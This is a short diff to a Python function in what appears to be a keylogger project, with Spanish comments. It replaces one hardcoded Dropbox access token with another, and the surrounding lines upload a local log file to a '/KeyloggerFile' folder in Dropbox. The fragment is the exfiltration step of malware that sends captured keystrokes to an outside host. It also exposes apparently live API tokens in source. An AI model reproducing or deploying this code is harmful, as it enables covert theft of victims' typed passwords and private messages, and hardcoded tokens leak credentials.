@@ -22,7 +22,7 @@ def uploadDropbox():
     #Asignar direccion y nombre de doc en dropbox
     file_to = '/KeyloggerFile/Keylogger'+namefile
     #Autenticar acceso a dropbox a traves del token
-    dbx = dropbox.Dropbox('9NBLXzfcRWAAAAAAAAAAAVmidmySbjapdB6MQhoBrTzbDAinLViRQMpKsvaCbygM')
+    dbx = dropbox.Dropbox('PVSemjzms0AAAAAAAAAAARjGIhgXw8HS_n3m5WL_JtNM4X5gbwaB2u4Ifi2I7QAx')
     #Subir documento a la direccion indicada
     dbx.files_upload(open(file_from, 'rb').read(), file_to)
 
